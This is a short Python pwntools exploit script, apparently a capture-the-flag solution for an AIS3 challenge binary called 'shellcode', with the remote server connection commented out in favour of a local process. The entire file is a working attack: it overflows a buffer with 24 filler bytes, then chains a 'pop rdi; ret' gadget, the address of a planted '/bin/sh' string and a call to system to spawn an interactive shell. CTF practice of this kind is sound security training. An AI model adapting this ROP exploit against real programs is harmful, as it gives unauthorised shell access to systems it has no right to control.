#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = 'mf-pwn.ais3.org'
prot = 10103
#r = remote(ip, prot)
r = process("./shellcode")
pop_rdi_ret = 0x400773
bin_sh_addr = 0x601070
call_system = 0x4006bf
#gdb.attach(r)
input()
print(r.recvuntil("What your name again!"))
r.sendline('/bin/sh\x00')
print(r.recvuntil("Say something:"))
payload = b"A" * 16 + b"B" * 8
payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(call_system)
r.sendline(payload)
r.interactive()
